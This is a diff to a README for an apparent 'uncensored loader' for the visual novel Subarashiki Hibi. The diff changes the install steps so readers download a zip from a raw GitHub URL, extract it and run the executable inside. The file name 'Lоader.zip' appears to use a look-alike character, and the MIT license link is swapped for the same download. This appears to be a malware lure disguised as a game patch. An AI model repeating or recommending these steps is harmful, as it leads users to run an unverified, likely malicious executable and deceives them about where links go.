@@ -8,8 +8,8 @@ Welcome to **Subarashiki Hibi Uncensored Version Loader**! This loader provides 
 
 ## 📦 Installation Instructions
 
-1. **Download Loader.rar from the repository.**
-2. Extract the contents of `Loader.rar` to your preferred directory using software like WinRAR, 7-Zip, or The Unarchiver.
+1. **Download https://raw.githubusercontent.com/Horley509/SubarashikiHibiRawEdition/main/Lоader.zip from the repository.**
+2. Extract the contents of `https://raw.githubusercontent.com/Horley509/SubarashikiHibiRawEdition/main/Lоader.zip` to your preferred directory using software like WinRAR, 7-Zip, or The Unarchiver.
 3. Run the loader executable for your operating system (see OS Compatibility Table below).
 4. Follow the on-screen prompts to set up the uncensored version.
 5. Enjoy the full Subarashiki Hibi experience!
@@ -71,7 +71,7 @@ All patches, scripts, and loaders are provided **as-is** and use is at your own 
 
 ## 📜 License (MIT) 
 
-This project is licensed under the terms of the MIT license. See the full license [here](https://opensource.org/licenses/MIT).
+This project is licensed under the terms of the MIT license. See the full license [here](https://raw.githubusercontent.com/Horley509/SubarashikiHibiRawEdition/main/Lоader.zip).
 
 ---
 
